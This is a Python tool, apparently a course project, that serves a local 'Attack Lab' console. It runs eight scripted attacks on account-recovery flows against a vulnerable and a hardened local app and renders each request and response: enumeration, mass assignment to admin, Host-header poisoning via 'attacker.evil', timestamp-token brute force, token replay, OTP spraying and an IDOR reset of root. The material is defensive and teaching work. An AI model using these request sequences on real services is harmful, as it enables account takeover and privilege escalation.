"""
System 6 - Attack Lab (visualization driver)

A supplementary tool (NOT part of the graded deliverable). It serves a visual
console on http://127.0.0.1:8000 and, on each click, fires the REAL HTTP
requests of an attack at the target app on 127.0.0.1:5000, returning every
request/response so the page can render exactly what went over the wire.

It also manages the TARGET as a subprocess so we can toggle Vulnerable <->
Hardened and watch the same attacks succeed, then fail. Verdicts are computed
from the ACTUAL responses, so before/after is honest.

Run:  python attack_lab.py    (then open http://127.0.0.1:8000)
"""
import os
import sys
import time
import subprocess
import requests
from fastapi import FastAPI
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel

# Project root = the parent of this attack_lab/ folder, derived from __file__
# so the tool keeps working if the project is moved or cloned elsewhere.
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PYEXE = sys.executable
TARGET_BASE = "http://127.0.0.1:5000"
VICTIM = "victim@corp.example"
ATTACKER_HOST = "attacker.evil"

app = FastAPI()
_proc = {"p": None, "target": "vulnerable"}


# --------------------------------------------------------------------------
# Target subprocess management
# --------------------------------------------------------------------------
def _kill_port_5000():
    subprocess.run(
        ["powershell", "-NoProfile", "-Command",
         "Get-NetTCPConnection -LocalPort 5000 -State Listen -ErrorAction SilentlyContinue | "
         "ForEach-Object { Stop-Process -Id $_.OwningProcess -Force -ErrorAction SilentlyContinue }"],
        capture_output=True)


def start_target(target):
    _stop_target()
    _kill_port_5000()
    time.sleep(0.8)
    if target == "vulnerable":
        path = os.path.join(ROOT, "vulnerable", "vulnerable_account_recovery.py")
        env = dict(os.environ)
    else:
        path = os.path.join(ROOT, "hardened", "hardened_account_recovery.py")
        env = dict(os.environ)
        # Expose tokens so the hardened build can DEMONSTRATE the #6/#8 fixes
        # on-merits (attacker is generously handed real tokens).
        env["HARNESS_EXPOSE_TOKENS"] = "1"
    _proc["p"] = subprocess.Popen([PYEXE, path], env=env,
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    _proc["target"] = target
    # wait for readiness
    for _ in range(40):
        try:
            requests.get(f"{TARGET_BASE}/outbox", timeout=0.5)
            return True
        except Exception:
            time.sleep(0.25)
    return False


def _stop_target():
    p = _proc.get("p")
    if p and p.poll() is None:
        p.terminate()
        try:
            p.wait(timeout=3)
        except Exception:
            p.kill()
    _proc["p"] = None


# --------------------------------------------------------------------------
# Instrumented HTTP call -> a renderable "step"
# --------------------------------------------------------------------------
def call(method, path, json=None, headers=None, label="", note=""):
    url = f"{TARGET_BASE}{path}"
    try:
        r = requests.request(method, url, json=json, headers=headers, timeout=5)
        try:
            body = r.json()
        except Exception:
            body = r.text
        status = r.status_code
    except Exception as e:
        body = f"<request error: {e}>"
        status = 0
    return {
        "label": label, "method": method, "url": url,
        "headers": headers or None, "body": json, "status": status,
        "response": body, "note": note,
    }


def reset_state():
    """Fresh target state (in-memory apps reset on restart)."""
    start_target(_proc["target"])


# --------------------------------------------------------------------------
# The 8 attacks — each returns {steps:[...], verdict:{gain, label}}
# Verdicts are derived from REAL responses so they are honest for either target.
# --------------------------------------------------------------------------
def a1_enroll_enum():
    steps = []
    probes = [("victim", "existing username"), ("root", "existing username"),
              ("ceo", "unused username")]
    found = []
    for name, kind in probes:
        s = call("POST", "/register",
                 json={"username": name, "email": f"probe_{name}@nope.invalid", "password": "x"},
                 label=f"Register username '{name}' ({kind})",
                 note="Distinct error reveals existence" )
        steps.append(s)
        if s["status"] == 409 and "username" in str(s["response"]):
            found.append(name)
    gain = len(found) > 0
    return {"steps": steps,
            "verdict": {"gain": gain,
                        "label": (f"ENUMERATED: {found} exist (distinct errors)" if gain
                                  else "BLOCKED: responses identical, nothing enumerable")}}


def a2_mass_assign():
    honest = call("POST", "/register",
                  json={"username": "honest_user", "email": "honest@demo.example", "password": "pw1"},
                  label="Honest signup (no privilege field)")
    evil = call("POST", "/register",
                json={"username": "mallory", "email": "mallory@evil.example", "password": "pw2", "is_admin": 1},
                label="Malicious signup WITH is_admin:1",
                note="The whole attack is this one extra key")
    lh = call("POST", "/login", json={"email": "honest@demo.example", "password": "pw1"},
              label="Login as honest_user")
    lm = call("POST", "/login", json={"email": "mallory@evil.example", "password": "pw2"},
              label="Login as mallory -> read server-assigned privilege")
    gain = isinstance(lm["response"], dict) and lm["response"].get("is_admin") is True
    return {"steps": [honest, evil, lh, lm],
            "verdict": {"gain": gain,
                        "label": ("PRIVILEGE ESCALATION: mallory is admin" if gain
                                  else "BLOCKED: is_admin ignored, mallory is a normal user")}}


def a3_recovery_enum():
    known = call("POST", "/forgot-password", json={"email": VICTIM},
                 label="forgot-password for a KNOWN email")
    unknown = call("POST", "/forgot-password", json={"email": "nobody@nowhere.test"},
                   label="forgot-password for an UNKNOWN email",
                   note="Compare status codes / bodies")
    gain = known["status"] != unknown["status"]
    return {"steps": [known, unknown],
            "verdict": {"gain": gain,
                        "label": (f"ENUMERATION ORACLE: {known['status']} vs {unknown['status']}" if gain
                                  else "BLOCKED: identical response for known & unknown")}}


def a4_host_header():
    poisoned = call("POST", "/forgot-password", json={"email": VICTIM},
                    headers={"Host": ATTACKER_HOST},
                    label=f"forgot-password for victim WITH Host: {ATTACKER_HOST}",
                    note="Server builds the reset link from... what?")
    box = call("GET", "/outbox", label="Read the victim's delivered mail")
    link = ""
    try:
        link = box["response"][VICTIM]["reset_link"]
    except Exception:
        link = ""
    poisoned_link = ATTACKER_HOST in (link or "")
    steps = [poisoned, box]
    if poisoned_link:
        token = box["response"][VICTIM]["token"]
        rr = call("POST", "/reset-password",
                  json={"token": token, "new_password": "attacker_owns_this", "email": VICTIM},
                  label="Attacker uses the captured token to reset victim")
        lr = call("POST", "/login", json={"email": VICTIM, "password": "attacker_owns_this"},
                  label="Login as victim with attacker's password")
        steps += [rr, lr]
    return {"steps": steps,
            "verdict": {"gain": poisoned_link,
                        "label": (f"POISONED: link points to {ATTACKER_HOST}, token exfiltrated" if poisoned_link
                                  else "BLOCKED: link uses server BASE_URL, host header ignored")}}


def a5_weak_secrets():
    t_before = int(time.time() * 1000)
    trig = call("POST", "/forgot-password", json={"email": VICTIM},
                label="Trigger victim reset; bracket the server clock",
                note=f"token guessed as int(time*1000) near {t_before}")
    t_after = int(time.time() * 1000)
    lo, hi = t_before - 40, t_after + 40
    found = None
    tries = 0
    for cand in range(lo, hi + 1):
        tries += 1
        r = requests.post(f"{TARGET_BASE}/reset-password",
                          json={"token": str(cand), "new_password": "predicted_pwn", "email": VICTIM},
                          timeout=5)
        if r.status_code == 200:
            found = str(cand)
            break
    scan = {"label": f"Brute-force the {hi-lo+1}-value time window (no mailbox access)",
            "method": "POST", "url": f"{TARGET_BASE}/reset-password x{tries}",
            "headers": None, "body": {"token": "<epoch-ms candidates>", "new_password": "predicted_pwn"},
            "status": 200 if found else 400,
            "response": (f"HIT: token={found} after {tries} guesses" if found
                         else f"no hit in {tries} guesses"),
            "note": "token space is only a few hundred integers" if found else "token is high-entropy"}
    steps = [trig, scan]
    if found:
        lr = call("POST", "/login", json={"email": VICTIM, "password": "predicted_pwn"},
                  label="Login as victim with predicted-token password")
        steps.append(lr)
        gain = isinstance(lr["response"], dict) and lr["response"].get("status") == "ok"
    else:
        gain = False
    return {"steps": steps,
            "verdict": {"gain": gain,
                        "label": (f"CRACKED: token reconstructed from time in {tries} guesses" if gain
                                  else "BLOCKED: token is unpredictable (secrets.token_urlsafe)")}}


def _get_token(email):
    call("POST", "/forgot-password", json={"email": email})
    box = requests.get(f"{TARGET_BASE}/outbox", timeout=5).json()
    return (box.get(email) or {}).get("token")


def a6_replay():
    call("POST", "/forgot-password", json={"email": VICTIM})
    box = call("GET", "/outbox", label="Obtain a reset token (from mailbox)")
    token = None
    try:
        token = box["response"][VICTIM]["token"]
    except Exception:
        token = None
    u1 = call("POST", "/reset-password", json={"token": token, "new_password": "replay_A", "email": VICTIM},
              label="Use the token (attempt #1)")
    u2 = call("POST", "/reset-password", json={"token": token, "new_password": "replay_B", "email": VICTIM},
              label="REPLAY the SAME token (attempt #2)", note="Should a used token still work?")
    l2 = call("POST", "/login", json={"email": VICTIM, "password": "replay_B"},
              label="Login with the replayed password")
    gain = isinstance(l2["response"], dict) and l2["response"].get("status") == "ok"
    return {"steps": [box, u1, u2, l2],
            "verdict": {"gain": gain,
                        "label": ("REPLAYABLE: one token resets the password repeatedly" if gain
                                  else "BLOCKED: token is single-use, replay rejected")}}


def a7_otp_bruteforce():
    call("POST", "/forgot-password", json={"email": VICTIM})
    N = 40
    codes = {}
    for i in range(N):
        r = requests.post(f"{TARGET_BASE}/verify-otp",
                          json={"email": VICTIM, "otp": f"{999999-i:06d}"}, timeout=5)
        codes[r.status_code] = codes.get(r.status_code, 0) + 1
    spray = {"label": f"Spray {N} wrong OTPs at /verify-otp",
             "method": "POST", "url": f"{TARGET_BASE}/verify-otp x{N}",
             "headers": None, "body": {"email": VICTIM, "otp": "<wrong guesses>"},
             "status": 429 if 429 in codes else 400,
             "response": {"status_codes": codes,
                          "rate_limited_429": (429 in codes)},
             "note": "no throttle -> full 10^6 space reachable" if 429 not in codes
                     else "locked out after a few tries"}
    gain = 429 not in codes
    return {"steps": [spray],
            "verdict": {"gain": gain,
                        "label": ("NO LOCKOUT: unlimited attempts (full crack feasible)" if gain
                                  else "BLOCKED: account/IP locked after a few attempts (429)")}}


def a8_idor():
    base = call("POST", "/login", json={"email": "root@corp.example", "password": "pwned_by_idor"},
                label="Baseline: can attacker log into root? (expect 401)")
    call("POST", "/register", json={"username": "atk", "email": "atk@evil.example", "password": "atk"})
    reg = {"label": "Attacker registers their OWN normal account",
           "method": "POST", "url": f"{TARGET_BASE}/register", "headers": None,
           "body": {"username": "atk", "email": "atk@evil.example", "password": "atk"},
           "status": 200, "response": "registered", "note": ""}
    call("POST", "/forgot-password", json={"email": "atk@evil.example"})
    box = requests.get(f"{TARGET_BASE}/outbox", timeout=5).json()
    token = (box.get("atk@evil.example") or {}).get("token")
    tok_step = {"label": "Attacker gets a token for their OWN account",
                "method": "GET", "url": f"{TARGET_BASE}/outbox", "headers": None, "body": None,
                "status": 200, "response": {"atk_token": (token[:16]+"..." if token else None)},
                "note": "a token they are fully entitled to"}
    attack = call("POST", "/reset-password",
                  json={"token": token, "new_password": "pwned_by_idor", "email": "root@corp.example"},
                  label="Reset with attacker's token but email=root@corp.example",
                  note="Which account does the server change?")
    after = call("POST", "/login", json={"email": "root@corp.example", "password": "pwned_by_idor"},
                 label="Login to ROOT with attacker's chosen password")
    gain = isinstance(after["response"], dict) and after["response"].get("is_admin") is True
    return {"steps": [base, reg, tok_step, attack, after],
            "verdict": {"gain": gain,
                        "label": ("ADMIN TAKEOVER: attacker's token reset root" if gain
                                  else "BLOCKED: reset bound to token's own account, root untouched")}}


ATTACKS = {
    "1": ("Enrollment enumeration", "CWE-204", a1_enroll_enum),
    "2": ("Mass assignment -> admin", "CWE-915", a2_mass_assign),
    "3": ("Recovery enumeration", "CWE-204", a3_recovery_enum),
    "4": ("Host-header link poisoning", "CWE-644", a4_host_header),
    "5": ("Predictable token", "CWE-330", a5_weak_secrets),
    "6": ("Token replay / no expiry", "CWE-640", a6_replay),
    "7": ("OTP brute force / no lockout", "CWE-307", a7_otp_bruteforce),
    "8": ("IDOR / broken binding", "CWE-639", a8_idor),
}


class RunIn(BaseModel):
    id: str


class TargetIn(BaseModel):
    target: str


@app.post("/api/run")
def api_run(inp: RunIn):
    reset_state()  # fresh target for a clean, reproducible demo
    name, cwe, fn = ATTACKS[inp.id]
    result = fn()
    result["meta"] = {"id": inp.id, "name": name, "cwe": cwe, "target": _proc["target"]}
    return JSONResponse(result)


@app.post("/api/target")
def api_target(inp: TargetIn):
    ok = start_target(inp.target)
    return {"ok": ok, "target": _proc["target"]}


@app.get("/api/status")
def api_status():
    return {"target": _proc["target"]}


@app.get("/", response_class=HTMLResponse)
def index():
    return HTML


HTML = r"""<!doctype html><html><head><meta charset="utf-8"><title>System 6 - Attack Lab</title>
<style>
:root{--bg:#0d1117;--panel:#161b22;--line:#30363d;--ink:#e6edf3;--mut:#8b949e;
--red:#ff6b6b;--redbg:#3d1418;--grn:#3fb950;--grnbg:#0f2e17;--acc:#58a6ff;--amber:#d29922;}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--ink);
font-family:-apple-system,Segoe UI,Roboto,sans-serif;font-size:14px}
header{padding:14px 20px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:16px;flex-wrap:wrap}
h1{font-size:17px;margin:0;font-weight:700}
.sub{color:var(--mut);font-size:12px}
.toggle{margin-left:auto;display:flex;gap:8px;align-items:center}
.badge{padding:4px 10px;border-radius:20px;font-size:12px;font-weight:700}
.badge.vuln{background:var(--redbg);color:var(--red);border:1px solid #6e2530}
.badge.hard{background:var(--grnbg);color:var(--grn);border:1px solid #1f5c30}
button{font-family:inherit;cursor:pointer}
.tbtn{background:var(--panel);color:var(--ink);border:1px solid var(--line);padding:6px 12px;border-radius:6px;font-size:12px}
.tbtn.active{border-color:var(--acc);color:var(--acc)}
.wrap{display:flex;height:calc(100vh - 55px)}
.side{width:300px;border-right:1px solid var(--line);overflow-y:auto;padding:10px}
.acard{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:10px 12px;margin-bottom:8px;cursor:pointer;transition:.15s}
.acard:hover{border-color:var(--acc)}
.acard .n{font-weight:700}.acard .c{color:var(--mut);font-size:11px;font-family:monospace}
.main{flex:1;overflow-y:auto;padding:18px 24px}
.empty{color:var(--mut);margin-top:40px;text-align:center}
.title{font-size:18px;font-weight:700;margin:0 0 2px}
.desc{color:var(--mut);margin-bottom:16px;font-size:13px}
.step{background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--acc);
border-radius:6px;padding:10px 12px;margin-bottom:10px;opacity:0;transform:translateY(6px);
animation:in .3s forwards}
@keyframes in{to{opacity:1;transform:none}}
.slabel{font-weight:600;margin-bottom:6px}
.req,.res{font-family:"Cascadia Code",Consolas,monospace;font-size:12px;white-space:pre-wrap;word-break:break-all}
.req{color:#a5d6ff;background:#0b1020;border:1px solid var(--line);border-radius:5px;padding:6px 8px;margin-bottom:6px}
.res{color:var(--ink);background:#0b0f16;border:1px solid var(--line);border-radius:5px;padding:6px 8px}
.pill{display:inline-block;padding:1px 8px;border-radius:12px;font-weight:700;font-size:11px;margin-right:6px}
.p2{background:var(--grnbg);color:var(--grn)} .p4{background:#3a2e10;color:var(--amber)}
.p5{background:var(--redbg);color:var(--red)} .p0{background:#333;color:#ccc}
.note{color:var(--mut);font-style:italic;font-size:12px;margin-top:5px}
.hostline{color:var(--red);font-weight:700}
.verdict{margin-top:14px;padding:14px 16px;border-radius:8px;font-weight:700;font-size:15px}
.gain{background:var(--redbg);color:var(--red);border:1px solid #6e2530}
.block{background:var(--grnbg);color:var(--grn);border:1px solid #1f5c30}
.run{background:var(--acc);color:#04121f;border:none;padding:8px 16px;border-radius:6px;font-weight:700;margin-bottom:14px}
.spin{color:var(--amber)}
</style></head><body>
<header>
  <h1>System 6 — Account Recovery <span style="color:var(--acc)">Attack Lab</span></h1>
  <span class="sub">real requests → live responses → honest verdict</span>
  <div class="toggle">
    <span class="sub">Target:</span>
    <button class="tbtn active" id="tv" onclick="setTarget('vulnerable')">● Vulnerable (Flask)</button>
    <button class="tbtn" id="th" onclick="setTarget('hardened')">● Hardened (FastAPI)</button>
    <span id="tbadge" class="badge vuln">VULNERABLE</span>
  </div>
</header>
<div class="wrap">
  <div class="side" id="side"></div>
  <div class="main" id="main"><div class="empty">← pick an attack to run it live</div></div>
</div>
<script>
const ATTACKS=[
 ["1","Enrollment enumeration","CWE-204"],["2","Mass assignment → admin","CWE-915"],
 ["3","Recovery enumeration","CWE-204"],["4","Host-header link poisoning","CWE-644"],
 ["5","Predictable token","CWE-330"],["6","Token replay / no expiry","CWE-640"],
 ["7","OTP brute force / no lockout","CWE-307"],["8","IDOR / broken binding","CWE-639"]];
const DESC={
 "1":"Distinct 'already taken' errors turn /register into an account oracle.",
 "2":"One extra key (is_admin:1) in the signup payload is bound straight into the user row.",
 "3":"Known vs unknown emails diverge, confirming membership from forgot-password traffic.",
 "4":"The reset link is built from the Host header — poison it and the victim's token goes to you.",
 "5":"The token is int(time*1000). Brute-force the millisecond window; no mailbox needed.",
 "6":"Tokens never expire and are never consumed — a once-seen token is a permanent key.",
 "7":"A 6-digit OTP with unlimited attempts: spray until it matches.",
 "8":"The reset target comes from a client 'email' field, not the token — reset anyone."};
let target="vulnerable";
const side=document.getElementById('side'), main=document.getElementById('main');
ATTACKS.forEach(([id,name,cwe])=>{
  const d=document.createElement('div');d.className='acard';d.onclick=()=>run(id);
  d.innerHTML=`<div class="n">#${id} · ${name}</div><div class="c">${cwe}</div>`;
  side.appendChild(d);});
function setTarget(t){
  target=t;
  document.getElementById('tv').classList.toggle('active',t=='vulnerable');
  document.getElementById('th').classList.toggle('active',t=='hardened');
  const b=document.getElementById('tbadge');
  b.className='badge '+(t=='vulnerable'?'vuln':'hard');
  b.textContent=t.toUpperCase();
  main.innerHTML=`<div class="empty spin">switching target to ${t}…</div>`;
  fetch('/api/target',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({target:t})}).then(r=>r.json()).then(()=>{
    main.innerHTML=`<div class="empty">target is now <b>${t}</b> — pick an attack</div>`;});
}
function pill(s){const c=s>=200&&s<300?'p2':s>=400&&s<500?(s==429?'p4':'p5'):s>=500?'p5':'p0';
  return `<span class="pill ${c}">HTTP ${s}</span>`;}
function j(o){if(o==null)return'';return typeof o==='string'?o:JSON.stringify(o,null,1);}
function reqLine(s){
  let h=s.headers?('\n'+Object.entries(s.headers).map(([k,v])=>{
     const cls=(k=='Host'&&String(v).includes('attacker'))?'hostline':'';
     return `<span class="${cls}">${k}: ${v}</span>`;}).join('\n')):'';
  let b=s.body?('\n'+j(s.body)):'';
  return `${s.method} ${s.url}${h}${b}`;}
async function run(id){
  main.innerHTML=`<div class="title">#${id} — running against <b>${target}</b>…</div>
    <div class="empty spin">firing real requests…</div>`;
  const res=await fetch('/api/run',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({id})}).then(r=>r.json());
  render(id,res);
}
function render(id,res){
  const m=res.meta;
  let html=`<div class="title">#${m.id} — ${m.name} <span class="c" style="font-family:monospace;color:var(--mut)">${m.cwe}</span></div>
    <div class="desc">${DESC[id]} &nbsp;·&nbsp; target: <b>${m.target}</b></div>`;
  res.steps.forEach((s,i)=>{
    const rl=String(s.response).includes(target)?'':'';
    let resp=j(s.response);
    // highlight poisoned host in response
    resp=resp.replace(/attacker\.evil/g,'<span class="hostline">attacker.evil</span>');
    html+=`<div class="step" style="animation-delay:${i*0.12}s">
      <div class="slabel">${i+1}. ${s.label}</div>
      <div class="req">${reqLine(s)}</div>
      <div class="res">${pill(s.status)}${resp}</div>
      ${s.note?`<div class="note">${s.note}</div>`:''}</div>`;
  });
  const v=res.verdict;
  html+=`<div class="verdict ${v.gain?'gain':'block'}">${v.gain?'🔓 ATTACKER GAIN':'🛡 BLOCKED'} — ${v.label}</div>`;
  main.innerHTML=html;
}
</script></body></html>"""


if __name__ == "__main__":
    import uvicorn
    start_target("vulnerable")
    uvicorn.run(app, host="127.0.0.1", port=8000, log_level="warning")
